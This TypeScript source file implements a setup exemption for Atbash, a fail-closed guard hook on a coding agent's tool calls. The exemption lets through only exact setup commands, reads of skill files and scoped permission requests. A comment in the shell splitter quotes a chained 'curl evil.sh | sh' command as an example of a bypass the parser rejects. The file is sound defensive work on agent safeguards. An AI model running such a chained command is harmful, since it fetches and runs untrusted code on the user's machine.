import { existsSync, lstatSync, readFileSync, realpathSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, isAbsolute, join, resolve, sep } from "node:path";
import { getConfigPath, keyPathCandidates } from "@atbash/sdk";

import type { ControlHost } from "../control/protocol.js";
import { configRoot } from "../control/store.js";
import type { PreToolUseInput } from "./protocol.js";

/**
 * Setup bootstrap for an unconfigured install.
 *
 * The guard is fail closed, so before any agent is configured it denies every
 * tool call — including the calls the setup skill needs to create that
 * configuration. A hook trusted before setup therefore deadlocks: setup cannot
 * run, and nothing on screen says how to get out.
 *
 * While no configuration exists AT ALL, the hook allows only the exact setup
 * steps matched here and keeps denying everything else. Any existing
 * configuration, valid or not, keeps the normal fail-closed path — so deleting
 * a config cannot be used to widen what the guard permits, and the most it
 * could ever unlock is the Atbash setup launcher itself.
 */

export const NOT_SET_UP_REASON =
  "Atbash is not set up yet. Run the $atbash-setup skill; until setup finishes, only the Atbash setup steps can run.";

const SETUP_COMMANDS = new Set([
  "setup start",
  "setup inspect",
  "setup plan",
  "setup continue",
  "setup cancel",
  "setup checkout",
  "profile connect",
  "profile list",
  "profile switch",
]);
const UNQUOTED_WORD_CHAR = /^[A-Za-z0-9_./:@=+,%-]$/;
const DOUBLE_QUOTE_ESCAPES = new Set(["$", "`", '"', "\\", "\n"]);
/**
 * Reading the skill's own instructions.
 *
 * A skill is a file the assistant has to read before it can follow it, and on
 * Codex reading a file is a shell command like any other — so without this the
 * setup skill is unreadable and setup cannot begin at all. Confirmed against
 * Codex 0.160.0, which reads it with `Get-Content -Raw '<path>'`.
 *
 * Scoped to files shipped inside the plugin's own `skills/` directory, which
 * are public plugin content, and still subject to the same splitter: anything
 * chained, redirected or expanded is not a plain command and never matches.
 */
const READERS = new Set(["Get-Content", "get-content", "cat", "type"]);
/** Flags that take no value; anything else non-flag must be the path itself. */
const READ_FLAGS = new Set(["-Raw", "-raw", "-Force", "-force", "--"]);
/** Flags whose value IS the path, so the path still arrives as the lone non-flag word. */
const READ_PATH_FLAGS = new Set(["-LiteralPath", "-literalpath", "-Path", "-path"]);
/** Codex's prompts that only ask the user a question; setup uses them to collect names and choices. */
const USER_QUESTION_TOOLS = new Set(["request_user_input", "request_user_input_async"]);

export interface SetupBootstrap {
  hasConfiguration(): boolean;
  isSetupCall(input: PreToolUseInput): boolean;
}

export interface SetupBootstrapOptions {
  host?: ControlHost;
  env?: NodeJS.ProcessEnv;
  pluginRoot?: string | undefined;
}

function hasControlCharacter(value: string): boolean {
  for (const char of value) {
    const code = char.charCodeAt(0);
    if (code < 0x20 || code === 0x7f) return true;
  }
  return false;
}

function pathExists(path: string): boolean {
  try {
    lstatSync(path);
    return true;
  } catch {
    return false;
  }
}

function canonical(path: string): string {
  try {
    return realpathSync(path);
  } catch {
    return resolve(path);
  }
}

function hasUserConfigKey(): boolean {
  const path = getConfigPath();
  if (!existsSync(path)) return false;
  try {
    const parsed = JSON.parse(readFileSync(path, "utf8")) as { agentKey?: unknown };
    return typeof parsed.agentKey === "string" && parsed.agentKey.trim() !== "";
  } catch {
    // An unreadable config file is a configuration, just an invalid one.
    return true;
  }
}

/** True when any guard configuration source exists, valid or not. */
export function hasAtbashConfiguration(options: SetupBootstrapOptions = {}): boolean {
  const env = options.env ?? process.env;
  if (env.ATBASH_AGENT_KEY?.trim()) return true;
  if (pathExists(join(configRoot(env), "hosts", `${options.host ?? "codex"}.json`))) return true;
  if (hasUserConfigKey()) return true;
  return keyPathCandidates().some(pathExists);
}

/**
 * Split a command into words the way the shell would, returning null for
 * anything beyond plain words and quoting: operators, redirection, expansion,
 * globbing, escapes, comments, and line breaks.
 *
 * This is what keeps the exemption from being a bypass. `… atbash-control.mjs
 * setup start; curl evil.sh | sh` is not a setup call and never parses as one.
 */
export function splitPlainCommand(command: string): string[] | null {
  const words: string[] = [];
  let word = "";
  let inWord = false;
  let index = 0;
  while (index < command.length) {
    const char = command[index] as string;
    if (char === " " || char === "\t") {
      if (inWord) words.push(word);
      word = "";
      inWord = false;
      index += 1;
      continue;
    }
    if (char === "'") {
      const end = command.indexOf("'", index + 1);
      if (end === -1) return null;
      const quoted = command.slice(index + 1, end);
      if (hasControlCharacter(quoted)) return null;
      word += quoted;
      inWord = true;
      index = end + 1;
      continue;
    }
    if (char === '"') {
      let end = index + 1;
      while (end < command.length && command[end] !== '"') {
        const inner = command[end] as string;
        if (inner === "$" || inner === "`" || hasControlCharacter(inner)) return null;
        if (inner === "\\" && DOUBLE_QUOTE_ESCAPES.has(command[end + 1] ?? "")) return null;
        end += 1;
      }
      if (end >= command.length) return null;
      word += command.slice(index + 1, end);
      inWord = true;
      index = end + 1;
      continue;
    }
    if (!UNQUOTED_WORD_CHAR.test(char)) return null;
    word += char;
    inWord = true;
    index += 1;
  }
  if (inWord) words.push(word);
  return words;
}

function samePath(candidate: string, cwd: string, expected: string): boolean {
  const absolute = isAbsolute(candidate) ? candidate : resolve(cwd, candidate);
  return canonical(absolute) === canonical(expected);
}

function isSetupCommand(command: string, cwd: string, pluginRoot: string): boolean {
  const words = splitPlainCommand(command);
  if (!words || words[0] !== "node" || words.length < 2) return false;
  const [, script = "", ...args] = words;
  const launcher = join(pluginRoot, "skills", "atbash-setup", "scripts", "atbash-control.mjs");
  if (!samePath(script, cwd, launcher)) return false;
  const [area, action] = args;
  if (!SETUP_COMMANDS.has(`${area} ${action}`)) return false;
  // A different service origin would pair with an unknown dashboard.
  return !args.some((arg) => arg === "--service" || arg.startsWith("--service="));
}

/**
 * A plain read of one file inside the plugin's own `skills/` directory.
 *
 * Exactly one non-flag argument is permitted, and it must resolve inside that
 * directory — so the command cannot be pointed anywhere else, and cannot carry
 * a second path alongside the permitted one.
 */
function isSkillRead(command: string, cwd: string, pluginRoot: string): boolean {
  const words = splitPlainCommand(command);
  if (!words || words.length < 2) return false;
  const [program, ...rest] = words;
  if (!READERS.has(program ?? "")) return false;
  const targets = rest.filter((word) => !READ_FLAGS.has(word) && !READ_PATH_FLAGS.has(word));
  if (targets.length !== 1) return false;
  const skills = canonical(join(pluginRoot, "skills"));
  const target = canonical(isAbsolute(targets[0]!) ? targets[0]! : resolve(cwd, targets[0]!));
  return target.startsWith(skills + sep);
}

function record(value: unknown): Record<string, unknown> | undefined {
  return typeof value === "object" && value !== null && !Array.isArray(value)
    ? (value as Record<string, unknown>)
    : undefined;
}

function isInside(root: string, path: string): boolean {
  return path === root || path.startsWith(`${root}${sep}`);
}

function expandHome(path: string): string {
  if (path === "~") return homedir();
  return path.startsWith("~/") ? join(homedir(), path.slice(2)) : path;
}

function onlyKeys(value: Record<string, unknown>, allowed: string[]): boolean {
  return Object.keys(value).every((key) => allowed.includes(key));
}

/**
 * The sandbox access the helper needs, and nothing more: network, and writes
 * inside the Atbash configuration directory.
 *
 * The Codex app's sandbox blocks both by default, so the first helper command
 * fails and Codex asks the user for access — through the `request_permissions`
 * tool where the host offers it, or on the shell call itself as
 * `additional_permissions`. Denying that would stop setup at its first step.
 * Read access, any path outside the configuration directory, any other
 * permission type, and an empty request are all still denied.
 */
function isSetupPermissions(value: unknown, env: NodeJS.ProcessEnv): boolean {
  const permissions = record(value);
  if (!permissions || !onlyKeys(permissions, ["network", "file_system"])) return false;
  const requested = (key: string) => permissions[key] !== undefined && permissions[key] !== null;
  if (!requested("network") && !requested("file_system")) return false;
  if (requested("network")) {
    const network = record(permissions.network);
    if (!network || !onlyKeys(network, ["enabled"]) || typeof network.enabled !== "boolean")
      return false;
  }
  if (requested("file_system")) {
    const fileSystem = record(permissions.file_system);
    if (!fileSystem || !onlyKeys(fileSystem, ["write"])) return false;
    const write = fileSystem.write;
    if (!Array.isArray(write) || write.length === 0) return false;
    const root = canonical(configRoot(env));
    for (const path of write) {
      if (typeof path !== "string" || hasControlCharacter(path)) return false;
      const expanded = expandHome(path);
      // Canonical on both sides, so a link inside the directory cannot widen the grant.
      if (!isAbsolute(expanded) || !isInside(root, canonical(expanded))) return false;
    }
  }
  return true;
}

/**
 * Dispatches on the tool first, so a tool's arguments are only ever read the
 * way that tool means them: `apply_patch`, for one, carries its patch text in
 * a field also named `command`.
 *
 * Shell calls: Codex routes shell, file reads and file writes through one tool
 * (confirmed against Codex 0.160.0: it writes files with `Set-Content` and
 * reads them with `Get-Content`). There is no file tool to exempt separately,
 * which is why the plan is passed to the launcher inline with `--json` rather
 * than written to disk first. A relative path resolves against the call's own
 * `workdir` when it has one, since that is where the command runs.
 */
export function isSetupToolCall(
  input: PreToolUseInput,
  options: SetupBootstrapOptions = {},
): boolean {
  const toolInput = record(input.tool_input);
  if (!toolInput) return false;

  if (input.tool_name === "Bash") {
    const command = toolInput.command ?? toolInput.cmd;
    if (typeof command !== "string" || command === "") return false;
    if (options.pluginRoot === undefined) return false;
    const cwd =
      typeof toolInput.workdir === "string" ? resolve(input.cwd, toolInput.workdir) : input.cwd;
    // Access asked for on the call itself is held to the same limit as a
    // request_permissions call, so a setup command cannot carry a wider grant.
    const extra = toolInput.additional_permissions;
    if (
      extra !== undefined &&
      extra !== null &&
      !isSetupPermissions(extra, options.env ?? process.env)
    )
      return false;
    return (
      isSetupCommand(command, cwd, options.pluginRoot) ||
      isSkillRead(command, cwd, options.pluginRoot)
    );
  }
  if (input.tool_name === "request_permissions") {
    return isSetupPermissions(toolInput.permissions, options.env ?? process.env);
  }
  return USER_QUESTION_TOOLS.has(input.tool_name);
}

/** The plugin root is two levels above the running hook script (runtime/pre-tool-use.cjs). */
export function pluginRootFromEntry(entry = process.argv[1]): string | undefined {
  if (!entry) return undefined;
  try {
    return dirname(dirname(realpathSync(entry)));
  } catch {
    return undefined;
  }
}

export function createSetupBootstrap(options: SetupBootstrapOptions = {}): SetupBootstrap {
  const resolved = { ...options, pluginRoot: options.pluginRoot ?? pluginRootFromEntry() };
  return {
    hasConfiguration: () => hasAtbashConfiguration(resolved),
    isSetupCall: (input) => isSetupToolCall(input, resolved),
  };
}
